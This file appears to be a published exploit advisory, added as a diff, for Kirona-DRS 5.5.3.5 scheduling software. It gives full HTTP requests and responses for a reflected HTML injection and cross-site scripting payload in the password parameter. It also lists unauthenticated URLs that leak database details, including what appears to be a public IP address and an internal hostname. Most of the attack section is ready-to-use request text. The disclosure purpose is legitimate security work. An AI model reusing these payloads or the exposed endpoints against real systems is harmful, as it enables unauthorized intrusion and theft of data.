@@ -1,0 +1,134 @@
+
+# Exploit Title: Kirona-DRS 5.5.3.5 Multiple Vulnerabilities.
+# Discovered Date: 03/10/2019
+# Exploit Author: Ramikan
+# Vendor Homepage: https://www.kirona.com/solutions/dynamic-resource-scheduling/
+# Affected Version: 5.5.3.5 may be other versions.
+# Tested On Version: 5.5.3.5 
+# Vendor Fix: Unknown
+# CVE: N/A	
+# Category: Web Apps
+# Reference : https://github.com/Ramikan/Vulnerabilities/blob/master/Kirona-DRS 5.5.3.5 Multiple Vulnerabilities
+# Blog: www.fact-in-hack.blogspot.com
+***************************************************************************************************************************
+
+Description:
+
+The application is vulnerable to the HTML injection, cross site scripting and sensitive data disclosure.
+
+***************************************************************************************************************************
+Vulnerabiity 1:HTML injection and XSS
+***************************************************************************************************************************
+Parameter Affected : password
+
+
+POST Request:
+
+POST /osm/report/ HTTP/1.1
+Host: 10.50.3.148
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+Connection: close
+Referer: https://10.50.3.148/osm/report/
+Upgrade-Insecure-Requests: 1
+
+create=true&password=&login=admin&password='<" ><<h1>HTML Injection-heading tag used</h1><script>alert("This is Cross Site Scripting")</script><!--
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 03 Oct 2019 14:56:05 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.14
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+XDomainRequestAllowed: 1
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Thu, 03 Oct 2019 14:56:05 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 728
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+          <html>
+          <head>  
+            <img src='logo.jpg'>      
+            <form method='POST'>
+              <input type='hidden' name='create' value='true'/>
+              <input type='hidden' name='password' value=''<" ><<h1>HTML Injection-heading tag used</h1><script>alert("This is Cross Site Scripting")</script><!--'/>
+              <table>
+                  <tr><td>Login:</td><td><input type='login' name='login'/></td></tr>
+                  <tr><td>Password:</td><td><input type='password' name='password'/></td></tr>
+                  <tr><td colspan='2'><input type='submit' value='Login'/> </td></tr>
+              </table>
+            </form>
+          </head>
+          </html>
+
+
+GET Request:
+
+GET https://vs-kdrs-l-01.selwoodhousing.local/osm/report/?password=%27%3C%22%20%3E%3C%3Ch1%3EHTML%20Injection-heading%20tag%20used%3C/h1%3E%3Cscript%3Ealert(%22This%20is%20Cross%20Site%20Scripting%22)%3C/script%3E%3C!-- HTTP/1.1
+Host: vs-kdrs-l-01.selwoodhousing.local
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 03 Oct 2019 14:53:35 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.14
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+XDomainRequestAllowed: 1
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Thu, 03 Oct 2019 14:53:35 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 728
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+          <html>
+          <head>  
+            <img src='logo.jpg'>      
+            <form method='POST'>
+              <input type='hidden' name='create' value='true'/>
+              <input type='hidden' name='password' value=''<" ><<h1>HTML Injection-heading tag used</h1><script>alert("This is Cross Site Scripting")</script><!--'/>
+              <table>
+                  <tr><td>Login:</td><td><input type='login' name='login'/></td></tr>
+                  <tr><td>Password:</td><td><input type='password' name='password'/></td></tr>
+                  <tr><td colspan='2'><input type='submit' value='Login'/> </td></tr>
+              </table>
+            </form>
+          </head>
+          </html> 
+        
+
+***************************************************************************************************************************
+Vulnerability 2: Source code and sensitive info disclosure.
+***************************************************************************************************************************
+
+Unauthenticated user can access this link (/osm/REGISTER.cmd, /osm_tiles/REGISTER.cmd) diectly which contains the sensitive info about the database. Exposes the sql database information such as tablename, username, etc.
+
+
+https://10.0.0.148/osm/REGISTER.cmd
+
+http://82.196.226.108/osm_tiles/REGISTER.cmd
+
+***************************************************************************************************************************
+Recommendation:
+***************************************************************************************************************************
+Contact vendor for the fix.
